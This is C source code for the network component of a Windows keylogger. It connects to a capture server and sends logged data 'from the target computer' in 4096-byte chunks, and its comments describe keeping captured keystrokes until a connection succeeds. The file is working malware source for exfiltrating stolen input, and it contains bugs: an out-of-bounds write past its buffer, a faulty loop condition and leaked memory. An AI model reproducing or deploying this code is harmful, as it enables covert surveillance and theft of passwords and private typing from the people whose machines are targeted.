#include "KeyLogger_clientCom.h"

#include <stdio.h>
#include <winsock2.h>
WSADATA WSA;
SOCKET keylogServer;
 /**
    Name startListeningClient

    Description: enable the server to write to t he socket  by calling
    a WSASartup to enable SOCKET communication, then initiate
    the socket. if the socket is established this function should
    return true, else this function should return false.
*/
bool startListeningClient()
{
    /*
        create the structure to store server level socket information
    */
    struct sockaddr_in server;

    /*
        if the windows socket does not start then return false so data collected
        by this keylogger may persist until the next time a connection is established.
    */
    if (WSAStartup(MAKEWORD(2,2),&WSA) !=0)
    {
        return false;
    }
    /*
        define a socket used for communication by this key-logger back to the capture
        server.
    */
    keylogServer = socket(AF_INET,SOCK_STREAM,0);
    /*
        if the socket registered is invalid then return false so that the data captured
        may persist until a connection can be established.
    */
    if (keylogServer == INVALID_SOCKET)
    {
        return false;
    }
    /*
        define the port, ip address, and protocol family this client should
        communicate on.
    */
    server.sin_port=htons(SERVER_CONNECTION_PORT);
    server.sin_family=AF_INET;
    server.sin_addr.S_un.S_addr = inet_addr(IP_ADDRESS);
    /*
        if the connection fails, return false so that a new attempt can be
        established on the next iteration.
    */
    if (connect(keylogServer,(SOCKADDR*)&server,sizeof(server))<0)
    {
        return false;
    }
    /*
        everything succeeded, return true;
    */
return true;
}
/**
    Title: WriteToServer
    Description: takes in a pointer to a character to a buffer  and writes it to the server, if the message is greater
    then 4096 bytes. then it is broken up into 4096 byte blocks and sent to the listening server. on the event of an 
    error this function should return false and let the keylogger process attempt to reconnect, if all messages are recived
    by the client and the socket has not been closed, then this process should return true. 

    @param buffer, the byte buffer to be written from the target computer to the server.
    
    @return a boolean value indicating if the buffer was successfully written to the server.
*/

bool WriteToServer(const char* buffer)
{
   /*
     if the length of the buffer is greater then 4096 bytes 
   */
    if(strlen(buffer)>0x1000)
    {
      /*
        allocate a temporary buffer to storew packets of the appropriate size to be sent to the server
      */
        char* temp = (char*)malloc(0x1000);
       /*
          keep sending data untill the buffer is empty.
       */
        for(int x=0; (strlen(buffer)-(x*0x1000))>0;x++)
        {
         /*
            if the buffer is still longer then 4096 bytes then send exactly 4096 bytes to the server
         */
            if(strlen(buffer+(x*0x1000))>0x1000)
                {
                    /*
                       zero out the temp buffer memory.
                    */
                    memset(temp,0,0x1000);
                    /*
                       coppy the bytes to be sent over to the temporary buffer
                    */
                    memcpy(temp,buffer+(x*0x1000),0x1000);
                    /*
                      set the last byte in the buffer to zero.
                    */
                    *(temp+0x1000)=0x00;
                    /*
                      if an error occures while attempting to send data over the socket then return false
                    */
                    if (send(keylogServer,temp,0x1000,0) ==SOCKET_ERROR)
                        return false;

                }
           /*
              if the remaining buffer is less then 4096 bytes then transmit the entire buffer. to the server 
           */
            else
                {
                    /*
                      zero out the temp buffer 
                    */
                    memset(temp,0,0x1000);
                   /*
                     coppy the buffer data over to the temp buffer.
                   */
                    memcpy(temp,buffer+(x*0x1000),strlen(buffer+(x*0x1000))+1);
                    /*
                     attempt to send the data from temp out to the server if this fails return false
                    */
                    if (send(keylogServer,temp,strlen(temp)+1,0) ==SOCKET_ERROR)
                        return false;
                    /*
                      the data was successfully sent and the socket is still open, return true. 
                    */
                    return true;
                }
           
        }
    }
   /*
     if the originating buffer is less then 4096 bytes attempt to send the buffer in its entirerty
   */
    else
    {
     /* 
       if the socket has failed or the data was not sent properly then return false so this program can 
       attempt to re-establish a connection.
     */
    if (send(keylogServer,buffer,strlen(buffer)+1,0) ==SOCKET_ERROR)
        return false;
    }
    /* 
      all is good with the world, return true the data has been sent successfully
    */
    return true;
}

